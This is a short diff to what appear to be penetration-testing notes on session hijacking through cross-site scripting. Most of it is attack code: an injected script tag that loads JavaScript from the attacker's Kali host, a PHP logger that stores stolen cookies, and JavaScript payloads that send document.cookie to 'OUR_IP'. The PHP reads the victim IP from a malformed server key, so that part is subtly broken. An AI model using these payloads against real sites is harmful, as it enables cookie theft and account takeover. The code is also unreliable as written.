@@ -1,5 +1,23 @@
 We can use XSS for hijacking the session. 
 
+First we need to check with Paramater is vulnerable. We can tets it by nc listerner in the kali and add below script. If we get the connection, then that parameter is vulnerable 
+    "><script src=http://<Kali IP address>:<Kali Port>/script.js></script>
+
+We need to have the PHP script called "Index.php" for capture the cookie.
+
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['10.129.159.227']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
+
+
 We can use below scripts to hijack the cookies. 
     document.location='http://OUR_IP/index.php?c='+document.cookie;
     new Image().src='http://OUR_IP/index.php?c='+document.cookie;
